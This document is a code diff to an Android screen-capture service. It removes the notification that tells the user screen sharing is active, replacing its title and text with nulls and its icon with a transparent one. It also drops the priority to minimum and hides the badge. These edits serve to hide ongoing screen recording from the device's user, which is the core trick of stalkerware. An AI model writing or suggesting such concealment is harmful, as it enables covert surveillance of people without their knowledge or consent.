@@ -20,9 +20,11 @@ public class ScreenCaptureService extends Service {
         createNotificationChannel();
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Ekran Yayını")
-                .setContentText("Ekran paylaşımı aktif")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setContentTitle(null)
+                .setContentText(null)
+                .setSmallIcon(android.R.color.transparent)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .build();
 
         startForeground(1, notification);
@@ -38,6 +40,7 @@ public class ScreenCaptureService extends Service {
                     CHANNEL_ID,
                     "Ekran Yayını Kanalı",
                     NotificationManager.IMPORTANCE_LOW);
+            channel.setShowBadge(false);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
